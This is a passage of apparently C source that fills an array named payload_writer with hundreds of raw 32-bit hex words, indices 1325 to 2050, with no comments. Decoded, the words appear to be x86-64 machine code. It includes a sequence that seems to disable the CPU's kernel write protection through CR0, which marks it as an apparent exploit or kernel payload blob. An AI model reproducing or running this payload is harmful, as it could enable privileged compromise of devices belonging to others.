  payload_writer[1325] = 0x158d48df;
  payload_writer[1326] = 0x0000401c;
  payload_writer[1327] = 0x29358d48;
  payload_writer[1328] = 0xe800003a;
  payload_writer[1329] = 0xfffff6fd;
  payload_writer[1330] = 0x8d48df89;
  payload_writer[1331] = 0x003f6715;
  payload_writer[1332] = 0x358d4800;
  payload_writer[1333] = 0x00003a0e;
  payload_writer[1334] = 0xfff6e8e8;
  payload_writer[1335] = 0x48df89ff;
  payload_writer[1336] = 0x4052158d;
  payload_writer[1337] = 0x8d480000;
  payload_writer[1338] = 0x003a0135;
  payload_writer[1339] = 0xf6d3e800;
  payload_writer[1340] = 0xdf89ffff;
  payload_writer[1341] = 0x0d158d48;
  payload_writer[1342] = 0x48000040;
  payload_writer[1343] = 0x39e5358d;
  payload_writer[1344] = 0xbee80000;
  payload_writer[1345] = 0x89fffff6;
  payload_writer[1346] = 0x158d48df;
  payload_writer[1347] = 0x00004050;
  payload_writer[1348] = 0xdf358d48;
  payload_writer[1349] = 0xe8000039;
  payload_writer[1350] = 0xfffff6a9;
  payload_writer[1351] = 0x8d48df89;
  payload_writer[1352] = 0x003ffb15;
  payload_writer[1353] = 0x358d4800;
  payload_writer[1354] = 0x000039d1;
  payload_writer[1355] = 0xfff694e8;
  payload_writer[1356] = 0x48df89ff;
  payload_writer[1357] = 0x3fa6158d;
  payload_writer[1358] = 0x8d480000;
  payload_writer[1359] = 0x0039c535;
  payload_writer[1360] = 0xf67fe800;
  payload_writer[1361] = 0xdf89ffff;
  payload_writer[1362] = 0xf1158d48;
  payload_writer[1363] = 0x4800003f;
  payload_writer[1364] = 0x39ba358d;
  payload_writer[1365] = 0x6ae80000;
  payload_writer[1366] = 0x89fffff6;
  payload_writer[1367] = 0x158d48df;
  payload_writer[1368] = 0x00003eec;
  payload_writer[1369] = 0xb1358d48;
  payload_writer[1370] = 0xe8000039;
  payload_writer[1371] = 0xfffff655;
  payload_writer[1372] = 0x8d48df89;
  payload_writer[1373] = 0x003f9715;
  payload_writer[1374] = 0x358d4800;
  payload_writer[1375] = 0x000039a3;
  payload_writer[1376] = 0xfff640e8;
  payload_writer[1377] = 0x48df89ff;
  payload_writer[1378] = 0x3e7a158d;
  payload_writer[1379] = 0x8d480000;
  payload_writer[1380] = 0x00399635;
  payload_writer[1381] = 0xf62be800;
  payload_writer[1382] = 0xdf89ffff;
  payload_writer[1383] = 0x55158d48;
  payload_writer[1384] = 0x4800003e;
  payload_writer[1385] = 0x3989358d;
  payload_writer[1386] = 0x16e80000;
  payload_writer[1387] = 0x89fffff6;
  payload_writer[1388] = 0x158d48df;
  payload_writer[1389] = 0x00003fc8;
  payload_writer[1390] = 0x7e358d48;
  payload_writer[1391] = 0xe8000039;
  payload_writer[1392] = 0xfffff601;
  payload_writer[1393] = 0x8d48df89;
  payload_writer[1394] = 0x003e1315;
  payload_writer[1395] = 0x358d4800;
  payload_writer[1396] = 0x00003971;
  payload_writer[1397] = 0xfff5ece8;
  payload_writer[1398] = 0x48df89ff;
  payload_writer[1399] = 0x3e06158d;
  payload_writer[1400] = 0x8d480000;
  payload_writer[1401] = 0x00396435;
  payload_writer[1402] = 0xf5d7e800;
  payload_writer[1403] = 0xdf89ffff;
  payload_writer[1404] = 0x81158d48;
  payload_writer[1405] = 0x4800003f;
  payload_writer[1406] = 0x3959358d;
  payload_writer[1407] = 0xc2e80000;
  payload_writer[1408] = 0x89fffff5;
  payload_writer[1409] = 0x158d48df;
  payload_writer[1410] = 0x00003e5c;
  payload_writer[1411] = 0x4d358d48;
  payload_writer[1412] = 0xe8000039;
  payload_writer[1413] = 0xfffff5ad;
  payload_writer[1414] = 0x8d48df89;
  payload_writer[1415] = 0x003ddf15;
  payload_writer[1416] = 0x358d4800;
  payload_writer[1417] = 0x0000393e;
  payload_writer[1418] = 0xfff598e8;
  payload_writer[1419] = 0x48df89ff;
  payload_writer[1420] = 0x3e9a158d;
  payload_writer[1421] = 0x8d480000;
  payload_writer[1422] = 0x00393535;
  payload_writer[1423] = 0xf583e800;
  payload_writer[1424] = 0xdf89ffff;
  payload_writer[1425] = 0x65158d48;
  payload_writer[1426] = 0x4800003e;
  payload_writer[1427] = 0x3926358d;
  payload_writer[1428] = 0x6ee80000;
  payload_writer[1429] = 0x89fffff5;
  payload_writer[1430] = 0x158d48df;
  payload_writer[1431] = 0x00003ef0;
  payload_writer[1432] = 0x17358d48;
  payload_writer[1433] = 0xe8000039;
  payload_writer[1434] = 0xfffff559;
  payload_writer[1435] = 0x8d48df89;
  payload_writer[1436] = 0x003dd315;
  payload_writer[1437] = 0x358d4800;
  payload_writer[1438] = 0x00003909;
  payload_writer[1439] = 0xfff544e8;
  payload_writer[1440] = 0x48df89ff;
  payload_writer[1441] = 0x3e66158d;
  payload_writer[1442] = 0x8d480000;
  payload_writer[1443] = 0x0038fa35;
  payload_writer[1444] = 0xf52fe800;
  payload_writer[1445] = 0xdf89ffff;
  payload_writer[1446] = 0x61158d48;
  payload_writer[1447] = 0x4800003e;
  payload_writer[1448] = 0x38eb358d;
  payload_writer[1449] = 0x1ae80000;
  payload_writer[1450] = 0x89fffff5;
  payload_writer[1451] = 0x8d485bdf;
  payload_writer[1452] = 0x003d7b15;
  payload_writer[1453] = 0x358d4800;
  payload_writer[1454] = 0x000038dc;
  payload_writer[1455] = 0xfff504e9;
  payload_writer[1456] = 0xc03148ff;
  payload_writer[1457] = 0x0fca8949;
  payload_writer[1458] = 0xc3017205;
  payload_writer[1459] = 0xec3d8348;
  payload_writer[1460] = 0x0000003a;
  payload_writer[1461] = 0xff501874;
  payload_writer[1462] = 0x003ae315;
  payload_writer[1463] = 0x08895900;
  payload_writer[1464] = 0xffc0c748;
  payload_writer[1465] = 0x48ffffff;
  payload_writer[1466] = 0xffffc2c7;
  payload_writer[1467] = 0x48c3ffff;
  payload_writer[1468] = 0x0003c0c7;
  payload_writer[1469] = 0xc9e90000;
  payload_writer[1470] = 0x48ffffff;
  payload_writer[1471] = 0x0004c0c7;
  payload_writer[1472] = 0xbde90000;
  payload_writer[1473] = 0x48ffffff;
  payload_writer[1474] = 0x0005c0c7;
  payload_writer[1475] = 0xb1e90000;
  payload_writer[1476] = 0x48ffffff;
  payload_writer[1477] = 0x0006c0c7;
  payload_writer[1478] = 0xa5e90000;
  payload_writer[1479] = 0x48ffffff;
  payload_writer[1480] = 0x000ac0c7;
  payload_writer[1481] = 0x99e90000;
  payload_writer[1482] = 0x48ffffff;
  payload_writer[1483] = 0x0009c0c7;
  payload_writer[1484] = 0x8de90000;
  payload_writer[1485] = 0x48ffffff;
  payload_writer[1486] = 0x003ac0c7;
  payload_writer[1487] = 0x81e90000;
  payload_writer[1488] = 0x48ffffff;
  payload_writer[1489] = 0x0039c0c7;
  payload_writer[1490] = 0x75e90000;
  payload_writer[1491] = 0x48ffffff;
  payload_writer[1492] = 0x0015c0c7;
  payload_writer[1493] = 0x69e90000;
  payload_writer[1494] = 0x48ffffff;
  payload_writer[1495] = 0x017ac0c7;
  payload_writer[1496] = 0x5de90000;
  payload_writer[1497] = 0x48ffffff;
  payload_writer[1498] = 0x0016c0c7;
  payload_writer[1499] = 0x51e90000;
  payload_writer[1500] = 0x48ffffff;
  payload_writer[1501] = 0x007bc0c7;
  payload_writer[1502] = 0x45e90000;
  payload_writer[1503] = 0x48ffffff;
  payload_writer[1504] = 0x007cc0c7;
  payload_writer[1505] = 0x39e90000;
  payload_writer[1506] = 0x48ffffff;
  payload_writer[1507] = 0x0080c0c7;
  payload_writer[1508] = 0x2de90000;
  payload_writer[1509] = 0x48ffffff;
  payload_writer[1510] = 0x0088c0c7;
  payload_writer[1511] = 0x21e90000;
  payload_writer[1512] = 0x48ffffff;
  payload_writer[1513] = 0x0089c0c7;
  payload_writer[1514] = 0x15e90000;
  payload_writer[1515] = 0x48ffffff;
  payload_writer[1516] = 0x00bcc0c7;
  payload_writer[1517] = 0x09e90000;
  payload_writer[1518] = 0x48ffffff;
  payload_writer[1519] = 0x00bdc0c7;
  payload_writer[1520] = 0xfde90000;
  payload_writer[1521] = 0x48fffffe;
  payload_writer[1522] = 0x00bec0c7;
  payload_writer[1523] = 0xf1e90000;
  payload_writer[1524] = 0x48fffffe;
  payload_writer[1525] = 0x0110c0c7;
  payload_writer[1526] = 0xe5e90000;
  payload_writer[1527] = 0x48fffffe;
  payload_writer[1528] = 0x01dec0c7;
  payload_writer[1529] = 0xd9e90000;
  payload_writer[1530] = 0x48fffffe;
  payload_writer[1531] = 0x01edc0c7;
  payload_writer[1532] = 0xcde90000;
  payload_writer[1533] = 0x48fffffe;
  payload_writer[1534] = 0x8348fa89;
  payload_writer[1535] = 0x894808ec;
  payload_writer[1536] = 0x025abff1;
  payload_writer[1537] = 0xf6310000;
  payload_writer[1538] = 0xb2e8c031;
  payload_writer[1539] = 0x5afffffe;
  payload_writer[1540] = 0x48d231c3;
  payload_writer[1541] = 0x3108ec83;
  payload_writer[1542] = 0xfee9e8f6;
  payload_writer[1543] = 0xd231ffff;
  payload_writer[1544] = 0x74fff883;
  payload_writer[1545] = 0xe8c7890c;
  payload_writer[1546] = 0xfffffee7;
  payload_writer[1547] = 0x000001ba;
  payload_writer[1548] = 0x5ad08900;
  payload_writer[1549] = 0xec8348c3;
  payload_writer[1550] = 0xd115ff08;
  payload_writer[1551] = 0x3100003c;
  payload_writer[1552] = 0xc08548d2;
  payload_writer[1553] = 0x89480e74;
  payload_writer[1554] = 0x2915ffc7;
  payload_writer[1555] = 0xba00003d;
  payload_writer[1556] = 0x00000001;
  payload_writer[1557] = 0xc35ad089;
  payload_writer[1558] = 0x88ec8148;
  payload_writer[1559] = 0x48000000;
  payload_writer[1560] = 0x60e8e689;
  payload_writer[1561] = 0x83ffffff;
  payload_writer[1562] = 0xc085ffca;
  payload_writer[1563] = 0x448b1178;
  payload_writer[1564] = 0xd2310c24;
  payload_writer[1565] = 0xf0002566;
  payload_writer[1566] = 0xa0003d66;
  payload_writer[1567] = 0x89c2940f;
  payload_writer[1568] = 0xc48148d0;
  payload_writer[1569] = 0x00000088;
  payload_writer[1570] = 0xec8348c3;
  payload_writer[1571] = 0x01ffba08;
  payload_writer[1572] = 0x01be0000;
  payload_writer[1573] = 0xe8000006;
  payload_writer[1574] = 0xfffffe6b;
  payload_writer[1575] = 0x74fff883;
  payload_writer[1576] = 0xc7895a08;
  payload_writer[1577] = 0xfffe6ae9;
  payload_writer[1578] = 0x41c358ff;
  payload_writer[1579] = 0x55d23154;
  payload_writer[1580] = 0xf3894853;
  payload_writer[1581] = 0x4ce8f631;
  payload_writer[1582] = 0x83fffffe;
  payload_writer[1583] = 0x6f74fff8;
  payload_writer[1584] = 0x0001ffba;
  payload_writer[1585] = 0x0601be00;
  payload_writer[1586] = 0x89480000;
  payload_writer[1587] = 0xe8c589df;
  payload_writer[1588] = 0xfffffe33;
  payload_writer[1589] = 0x41fff883;
  payload_writer[1590] = 0x4874c489;
  payload_writer[1591] = 0x400000bf;
  payload_writer[1592] = 0x0915ff00;
  payload_writer[1593] = 0x4800003b;
  payload_writer[1594] = 0x8948c085;
  payload_writer[1595] = 0xba2d74c3;
  payload_writer[1596] = 0x00400000;
  payload_writer[1597] = 0x89de8948;
  payload_writer[1598] = 0xfdf1e8ef;
  payload_writer[1599] = 0x8548ffff;
  payload_writer[1600] = 0x481074c0;
  payload_writer[1601] = 0x8948c289;
  payload_writer[1602] = 0xe78944de;
  payload_writer[1603] = 0xfffdeae8;
  payload_writer[1604] = 0x48dcebff;
  payload_writer[1605] = 0x15ffdf89;
  payload_writer[1606] = 0x00003c6c;
  payload_writer[1607] = 0xe8e78944;
  payload_writer[1608] = 0xfffffdef;
  payload_writer[1609] = 0x5def895b;
  payload_writer[1610] = 0xe4e95c41;
  payload_writer[1611] = 0x5bfffffd;
  payload_writer[1612] = 0xc35c415d;
  payload_writer[1613] = 0x56415741;
  payload_writer[1614] = 0x54415541;
  payload_writer[1615] = 0x81485355;
  payload_writer[1616] = 0x000888ec;
  payload_writer[1617] = 0xfc894900;
  payload_writer[1618] = 0xfff58949;
  payload_writer[1619] = 0x003bbf15;
  payload_writer[1620] = 0xc0854800;
  payload_writer[1621] = 0x00e2840f;
  payload_writer[1622] = 0xffbe0000;
  payload_writer[1623] = 0x4c000001;
  payload_writer[1624] = 0x8948ef89;
  payload_writer[1625] = 0xfe2de8c5;
  payload_writer[1626] = 0x8948ffff;
  payload_writer[1627] = 0x9515ffef;
  payload_writer[1628] = 0x4800003a;
  payload_writer[1629] = 0x840fc085;
  payload_writer[1630] = 0x000000b7;
  payload_writer[1631] = 0x08588d48;
  payload_writer[1632] = 0x1a358d48;
  payload_writer[1633] = 0x48000036;
  payload_writer[1634] = 0x15ffdf89;
  payload_writer[1635] = 0x00003b88;
  payload_writer[1636] = 0xd674c085;
  payload_writer[1637] = 0x05358d48;
  payload_writer[1638] = 0x48000036;
  payload_writer[1639] = 0x15ffdf89;
  payload_writer[1640] = 0x00003b74;
  payload_writer[1641] = 0xc274c085;
  payload_writer[1642] = 0x24bc8d4c;
  payload_writer[1643] = 0x00000080;
  payload_writer[1644] = 0x24b48d4c;
  payload_writer[1645] = 0x00000480;
  payload_writer[1646] = 0x4cd98948;
  payload_writer[1647] = 0x8d48e289;
  payload_writer[1648] = 0x0035de35;
  payload_writer[1649] = 0xff894c00;
  payload_writer[1650] = 0x15ffc031;
  payload_writer[1651] = 0x00003b60;
  payload_writer[1652] = 0x4cd98948;
  payload_writer[1653] = 0x8d48ea89;
  payload_writer[1654] = 0x0035c635;
  payload_writer[1655] = 0xf7894c00;
  payload_writer[1656] = 0x15ffc031;
  payload_writer[1657] = 0x00003b48;
  payload_writer[1658] = 0x4ce68948;
  payload_writer[1659] = 0xbce8ff89;
  payload_writer[1660] = 0x85fffffd;
  payload_writer[1661] = 0x6f850fc0;
  payload_writer[1662] = 0x8bffffff;
  payload_writer[1663] = 0x660c2444;
  payload_writer[1664] = 0x66f00025;
  payload_writer[1665] = 0x7540003d;
  payload_writer[1666] = 0xf6894c10;
  payload_writer[1667] = 0xe8ff894c;
  payload_writer[1668] = 0xffffff20;
  payload_writer[1669] = 0xffff51e9;
  payload_writer[1670] = 0x003d66ff;
  payload_writer[1671] = 0x47850f80;
  payload_writer[1672] = 0x4cffffff;
  payload_writer[1673] = 0x894cf689;
  payload_writer[1674] = 0xfe7de8ff;
  payload_writer[1675] = 0x37e9ffff;
  payload_writer[1676] = 0x48ffffff;
  payload_writer[1677] = 0x15ffef89;
  payload_writer[1678] = 0x00003b3c;
  payload_writer[1679] = 0x88c48148;
  payload_writer[1680] = 0x5b000008;
  payload_writer[1681] = 0x415c415d;
  payload_writer[1682] = 0x415e415d;
  payload_writer[1683] = 0x5741c35f;
  payload_writer[1684] = 0x55415641;
  payload_writer[1685] = 0x53555441;
  payload_writer[1686] = 0x08ec8348;
  payload_writer[1687] = 0x8948d231;
  payload_writer[1688] = 0xe8f631f3;
  payload_writer[1689] = 0xfffffc9f;
  payload_writer[1690] = 0xf631d231;
  payload_writer[1691] = 0x41df8948;
  payload_writer[1692] = 0x90e8c489;
  payload_writer[1693] = 0xbffffffc;
  payload_writer[1694] = 0x00010000;
  payload_writer[1695] = 0x15ffc589;
  payload_writer[1696] = 0x0000396c;
  payload_writer[1697] = 0x010000bf;
  payload_writer[1698] = 0xc6894900;
  payload_writer[1699] = 0x395e15ff;
  payload_writer[1700] = 0x85450000;
  payload_writer[1701] = 0x0b840fe4;
  payload_writer[1702] = 0x85000001;
  payload_writer[1703] = 0x03840fed;
  payload_writer[1704] = 0x31000001;
  payload_writer[1705] = 0x0002baf6;
  payload_writer[1706] = 0x89440000;
  payload_writer[1707] = 0xc58949e7;
  payload_writer[1708] = 0xfffd2ae8;
  payload_writer[1709] = 0xbaf631ff;
  payload_writer[1710] = 0x00000002;
  payload_writer[1711] = 0x1ce8ef89;
  payload_writer[1712] = 0x31fffffd;
  payload_writer[1713] = 0x0001baf6;
  payload_writer[1714] = 0x89440000;
  payload_writer[1715] = 0xfd0de8e7;
  payload_writer[1716] = 0xf631ffff;
  payload_writer[1717] = 0x000001ba;
  payload_writer[1718] = 0x48ef8900;
  payload_writer[1719] = 0xfce8c389;
  payload_writer[1720] = 0x31fffffc;
  payload_writer[1721] = 0x44f631d2;
  payload_writer[1722] = 0x8949e789;
  payload_writer[1723] = 0xfcede8c7;
  payload_writer[1724] = 0xd231ffff;
  payload_writer[1725] = 0xef89f631;
  payload_writer[1726] = 0xfffce2e8;
  payload_writer[1727] = 0xfb394cff;
  payload_writer[1728] = 0xdb310774;
  payload_writer[1729] = 0x00008ce9;
  payload_writer[1730] = 0xfb834800;
  payload_writer[1731] = 0xbb057e63;
  payload_writer[1732] = 0x00000064;
  payload_writer[1733] = 0x02badbf7;
  payload_writer[1734] = 0x48000000;
  payload_writer[1735] = 0x8944db63;
  payload_writer[1736] = 0xde8948e7;
  payload_writer[1737] = 0xfffcb6e8;
  payload_writer[1738] = 0xde8948ff;
  payload_writer[1739] = 0x000002ba;
  payload_writer[1740] = 0xe8ef8900;
  payload_writer[1741] = 0xfffffca7;
  payload_writer[1742] = 0x000001ba;
  payload_writer[1743] = 0xf6894c00;
  payload_writer[1744] = 0xe8e78944;
  payload_writer[1745] = 0xfffffba7;
  payload_writer[1746] = 0x000001ba;
  payload_writer[1747] = 0xee894c00;
  payload_writer[1748] = 0x89c78949;
  payload_writer[1749] = 0xe8c389ef;
  payload_writer[1750] = 0xfffffb93;
  payload_writer[1751] = 0x7eff8545;
  payload_writer[1752] = 0xc7394120;
  payload_writer[1753] = 0xc0311b75;
  payload_writer[1754] = 0x054c8a41;
  payload_writer[1755] = 0x0c384100;
  payload_writer[1756] = 0x488f7506;
  payload_writer[1757] = 0xc339c0ff;
  payload_writer[1758] = 0x01bbee7f;
  payload_writer[1759] = 0xeb000000;
  payload_writer[1760] = 0x4cdb3102;
  payload_writer[1761] = 0x15fff789;
  payload_writer[1762] = 0x000039fc;
  payload_writer[1763] = 0xffef894c;
  payload_writer[1764] = 0x0039f315;
  payload_writer[1765] = 0xe7894400;
  payload_writer[1766] = 0xfffb76e8;
  payload_writer[1767] = 0xe8ef89ff;
  payload_writer[1768] = 0xfffffb6f;
  payload_writer[1769] = 0xdb3102eb;
  payload_writer[1770] = 0x5bd8895a;
  payload_writer[1771] = 0x415c415d;
  payload_writer[1772] = 0x415e415d;
  payload_writer[1773] = 0x8348c35f;
  payload_writer[1774] = 0x01ba18ec;
  payload_writer[1775] = 0x48000000;
  payload_writer[1776] = 0x0f24748d;
  payload_writer[1777] = 0xfffb26e8;
  payload_writer[1778] = 0xffca83ff;
  payload_writer[1779] = 0x74c08548;
  payload_writer[1780] = 0x54be0f05;
  payload_writer[1781] = 0xd0890f24;
  payload_writer[1782] = 0x18c48348;
  payload_writer[1783] = 0x415741c3;
  payload_writer[1784] = 0x41554156;
  payload_writer[1785] = 0x48535554;
  payload_writer[1786] = 0x4418ec83;
  payload_writer[1787] = 0x8948268b;
  payload_writer[1788] = 0x85452414;
  payload_writer[1789] = 0x95880fe4;
  payload_writer[1790] = 0x41000000;
  payload_writer[1791] = 0x4902c483;
  payload_writer[1792] = 0x6349fd89;
  payload_writer[1793] = 0x3f8b48ec;
  payload_writer[1794] = 0x04e5c148;
  payload_writer[1795] = 0x49f68949;
  payload_writer[1796] = 0x894ccf89;
  payload_writer[1797] = 0xee8948c3;
  payload_writer[1798] = 0x386a15ff;
  payload_writer[1799] = 0x85480000;
  payload_writer[1800] = 0x458949c0;
  payload_writer[1801] = 0x41097500;
  payload_writer[1802] = 0xffff06c7;
  payload_writer[1803] = 0x60ebffff;
  payload_writer[1804] = 0x28548d48;
  payload_writer[1805] = 0x3c8b48e0;
  payload_writer[1806] = 0x54894824;
  payload_writer[1807] = 0x15ff0824;
  payload_writer[1808] = 0x0000387c;
  payload_writer[1809] = 0x24548b48;
  payload_writer[1810] = 0x3c8b4808;
  payload_writer[1811] = 0x02894824;
  payload_writer[1812] = 0x391215ff;
  payload_writer[1813] = 0x8b490000;
  payload_writer[1814] = 0xff480055;
  payload_writer[1815] = 0xfb8348c0;
  payload_writer[1816] = 0x448948ff;
  payload_writer[1817] = 0x894ce82a;
  payload_writer[1818] = 0x75f02a7c;
  payload_writer[1819] = 0x4ddb3114;
  payload_writer[1820] = 0x0d74ff85;
  payload_writer[1821] = 0xffff894c;
  payload_writer[1822] = 0x0038eb15;
  payload_writer[1823] = 0x588d4800;
  payload_writer[1824] = 0x458b4901;
  payload_writer[1825] = 0xdb634800;
  payload_writer[1826] = 0x285c8948;
  payload_writer[1827] = 0x268945f8;
  payload_writer[1828] = 0x18c48348;
  payload_writer[1829] = 0x5c415d5b;
  payload_writer[1830] = 0x5e415d41;
  payload_writer[1831] = 0x41c35f41;
  payload_writer[1832] = 0x41564157;
  payload_writer[1833] = 0x55544155;
  payload_writer[1834] = 0xec834853;
  payload_writer[1835] = 0xfe894918;
  payload_writer[1836] = 0x246c8d48;
  payload_writer[1837] = 0x5c8d4804;
  payload_writer[1838] = 0x89490824;
  payload_writer[1839] = 0xcc8949f7;
  payload_writer[1840] = 0x48ee8948;
  payload_writer[1841] = 0x8948d189;
  payload_writer[1842] = 0x158d48df;
  payload_writer[1843] = 0x000032d9;
  payload_writer[1844] = 0x49c58945;
  payload_writer[1845] = 0x48ffc883;
  payload_writer[1846] = 0x082444c7;
  payload_writer[1847] = 0x00000000;
  payload_writer[1848] = 0x042444c7;
  payload_writer[1849] = 0x00000000;
  payload_writer[1850] = 0xfffef0e8;
  payload_writer[1851] = 0xc88349ff;
  payload_writer[1852] = 0xf9894cff;
  payload_writer[1853] = 0xb5158d48;
  payload_writer[1854] = 0x48000032;
  payload_writer[1855] = 0x8948ee89;
  payload_writer[1856] = 0xfed7e8df;
  payload_writer[1857] = 0x8349ffff;
  payload_writer[1858] = 0x894cffc8;
  payload_writer[1859] = 0x158d48f1;
  payload_writer[1860] = 0x000032a3;
  payload_writer[1861] = 0x48ee8948;
  payload_writer[1862] = 0xbee8df89;
  payload_writer[1863] = 0x49fffffe;
  payload_writer[1864] = 0x48ffc883;
  payload_writer[1865] = 0x32920d8d;
  payload_writer[1866] = 0x8d480000;
  payload_writer[1867] = 0x00328f15;
  payload_writer[1868] = 0xee894800;
  payload_writer[1869] = 0xe8df8948;
  payload_writer[1870] = 0xfffffea1;
  payload_writer[1871] = 0xffc88349;
  payload_writer[1872] = 0x7f0d8d48;
  payload_writer[1873] = 0x48000032;
  payload_writer[1874] = 0x327f158d;
  payload_writer[1875] = 0x89480000;
  payload_writer[1876] = 0xdf8948ee;
  payload_writer[1877] = 0xfffe84e8;
  payload_writer[1878] = 0xc88349ff;
  payload_writer[1879] = 0x0d8d48ff;
  payload_writer[1880] = 0x00002987;
  payload_writer[1881] = 0x6b158d48;
  payload_writer[1882] = 0x48000032;
  payload_writer[1883] = 0x8948ee89;
  payload_writer[1884] = 0xfe67e8df;
  payload_writer[1885] = 0x8349ffff;
  payload_writer[1886] = 0x8d48ffc8;
  payload_writer[1887] = 0x00296a0d;
  payload_writer[1888] = 0x158d4800;
  payload_writer[1889] = 0x00003254;
  payload_writer[1890] = 0x48ee8948;
  payload_writer[1891] = 0x4ae8df89;
  payload_writer[1892] = 0x4dfffffe;
  payload_writer[1893] = 0x3274e485;
  payload_writer[1894] = 0xffc88349;
  payload_writer[1895] = 0x48e1894c;
  payload_writer[1896] = 0x3240158d;
  payload_writer[1897] = 0x89480000;
  payload_writer[1898] = 0xdf8948ee;
  payload_writer[1899] = 0xfffe2ce8;
  payload_writer[1900] = 0xc88349ff;
  payload_writer[1901] = 0xe1894cff;
  payload_writer[1902] = 0x2a158d48;
  payload_writer[1903] = 0x48000032;
  payload_writer[1904] = 0x8948ee89;
  payload_writer[1905] = 0xfe13e8df;
  payload_writer[1906] = 0x748bffff;
  payload_writer[1907] = 0x89440424;
  payload_writer[1908] = 0x7c8b48ea;
  payload_writer[1909] = 0x80e80824;
  payload_writer[1910] = 0x48fffff9;
  payload_writer[1911] = 0x5b18c483;
  payload_writer[1912] = 0x415c415d;
  payload_writer[1913] = 0x415e415d;
  payload_writer[1914] = 0x0000c35f;
  payload_writer[1915] = 0x54415541;
  payload_writer[1916] = 0x55f58949;
  payload_writer[1917] = 0x419c5153;
  payload_writer[1918] = 0x200ffa5c;
  payload_writer[1919] = 0xd88948c3;
  payload_writer[1920] = 0xffff2548;
  payload_writer[1921] = 0x220ffffe;
  payload_writer[1922] = 0x1afbe8c0;
  payload_writer[1923] = 0xcd830000;
  payload_writer[1924] = 0x78c085ff;
  payload_writer[1925] = 0x0099be4b;
  payload_writer[1926] = 0x8d480000;
  payload_writer[1927] = 0x0021663d;
  payload_writer[1928] = 0x31c03100;
  payload_writer[1929] = 0x9115ffed;
  payload_writer[1930] = 0xba000027;
  payload_writer[1931] = 0x00000005;
  payload_writer[1932] = 0x7d358d48;
  payload_writer[1933] = 0xbf000000;
  payload_writer[1934] = 0x00000099;
  payload_writer[1935] = 0x001a23e8;
  payload_writer[1936] = 0x48c03100;
  payload_writer[1937] = 0x21663d8d;
  payload_writer[1938] = 0x15ff0000;
  payload_writer[1939] = 0x0000276c;
  payload_writer[1940] = 0x74ed854d;
  payload_writer[1941] = 0x058d480b;
  payload_writer[1942] = 0x00000058;
  payload_writer[1943] = 0x00458949;
  payload_writer[1944] = 0x81c0200f;
  payload_writer[1945] = 0x010000e3;
  payload_writer[1946] = 0xd8094800;
  payload_writer[1947] = 0x48c0220f;
  payload_writer[1948] = 0x8b48db85;
  payload_writer[1949] = 0x0027ab05;
  payload_writer[1950] = 0x48077400;
  payload_writer[1951] = 0x0274c085;
  payload_writer[1952] = 0x5441d0ff;
  payload_writer[1953] = 0xe8895a9d;
  payload_writer[1954] = 0x5c415d5b;
  payload_writer[1955] = 0x48c35d41;
  payload_writer[1956] = 0x1a74ff85;
  payload_writer[1957] = 0x8548c031;
  payload_writer[1958] = 0x481374f6;
  payload_writer[1959] = 0x0b74c239;
  payload_writer[1960] = 0x88070c8a;
  payload_writer[1961] = 0xff48060c;
  payload_writer[1962] = 0x31f0ebc0;
  payload_writer[1963] = 0x0eb8c3c0;
  payload_writer[1964] = 0xc3000000;
  payload_writer[1965] = 0x56415741;
  payload_writer[1966] = 0x54415541;
  payload_writer[1967] = 0x83485355;
  payload_writer[1968] = 0x8d4828ec;
  payload_writer[1969] = 0x00033f05;
  payload_writer[1970] = 0xff854800;
  payload_writer[1971] = 0x4cf38948;
  payload_writer[1972] = 0x48187e8b;
  payload_writer[1973] = 0x10244489;
  payload_writer[1974] = 0xb0258d4c;
  payload_writer[1975] = 0x74ffffff;
  payload_writer[1976] = 0x058b4813;
  payload_writer[1977] = 0x000026f4;
  payload_writer[1978] = 0xdd258b4c;
  payload_writer[1979] = 0x48000026;
  payload_writer[1980] = 0x10244489;
  payload_writer[1981] = 0xd93d8d48;
  payload_writer[1982] = 0x3100001d;
  payload_writer[1983] = 0xb915ffc0;
  payload_writer[1984] = 0x48000026;
  payload_writer[1985] = 0x31104b8b;
  payload_writer[1986] = 0x538b48c0;
  payload_writer[1987] = 0x3d8d4808;
  payload_writer[1988] = 0x00001dd3;
  payload_writer[1989] = 0x204b8b4c;
  payload_writer[1990] = 0x18438b4c;
  payload_writer[1991] = 0xff338b48;
  payload_writer[1992] = 0x00269715;
  payload_writer[1993] = 0x058b4800;
  payload_writer[1994] = 0x00002710;
  payload_writer[1995] = 0x48c08548;
  payload_writer[1996] = 0x18244489;
  payload_writer[1997] = 0x0273840f;
  payload_writer[1998] = 0x8b480000;
  payload_writer[1999] = 0xbfe8087b;
  payload_writer[2000] = 0x48000017;
  payload_writer[2001] = 0x8948c085;
  payload_writer[2002] = 0x12752404;
  payload_writer[2003] = 0xb73d8d48;
  payload_writer[2004] = 0x4500001d;
  payload_writer[2005] = 0x15ffed31;
  payload_writer[2006] = 0x00002660;
  payload_writer[2007] = 0x8b4857eb;
  payload_writer[2008] = 0x8b480853;
  payload_writer[2009] = 0x8b482434;
  payload_writer[2010] = 0xd4ff413b;
  payload_writer[2011] = 0xc589c085;
  payload_writer[2012] = 0x8d482074;
  payload_writer[2013] = 0x001dab3d;
  payload_writer[2014] = 0x45c03100;
  payload_writer[2015] = 0x3145e431;
  payload_writer[2016] = 0x3515fff6;
  payload_writer[2017] = 0x45000026;
  payload_writer[2018] = 0x3145ff31;
  payload_writer[2019] = 0x0234e9ed;
  payload_writer[2020] = 0x8d490000;
  payload_writer[2021] = 0x001820bf;
  payload_writer[2022] = 0x1764e800;
  payload_writer[2023] = 0x85480000;
  payload_writer[2024] = 0xc58949c0;
  payload_writer[2025] = 0x8d481d75;
  payload_writer[2026] = 0x001d903d;
  payload_writer[2027] = 0xffc03100;
  payload_writer[2028] = 0x00260715;
  payload_writer[2029] = 0xe4314500;
  payload_writer[2030] = 0x45f63145;
  payload_writer[2031] = 0x66e9ff31;
  payload_writer[2032] = 0x48000001;
  payload_writer[2033] = 0x73e8c789;
  payload_writer[2034] = 0x48000011;
  payload_writer[2035] = 0xc085c863;
  payload_writer[2036] = 0x244c8948;
  payload_writer[2037] = 0x48187908;
  payload_writer[2038] = 0x1d7d3d8d;
  payload_writer[2039] = 0xc0310000;
  payload_writer[2040] = 0x25d615ff;
  payload_writer[2041] = 0xc7480000;
  payload_writer[2042] = 0x00082444;
  payload_writer[2043] = 0x4d000000;
  payload_writer[2044] = 0x3174ff85;
  payload_writer[2045] = 0x24448b48;
  payload_writer[2046] = 0xfa894c08;
  payload_writer[2047] = 0x107b8b48;
  payload_writer[2048] = 0x05748d49;
  payload_writer[2049] = 0xd4ff4100;
  payload_writer[2050] = 0xc589c085;
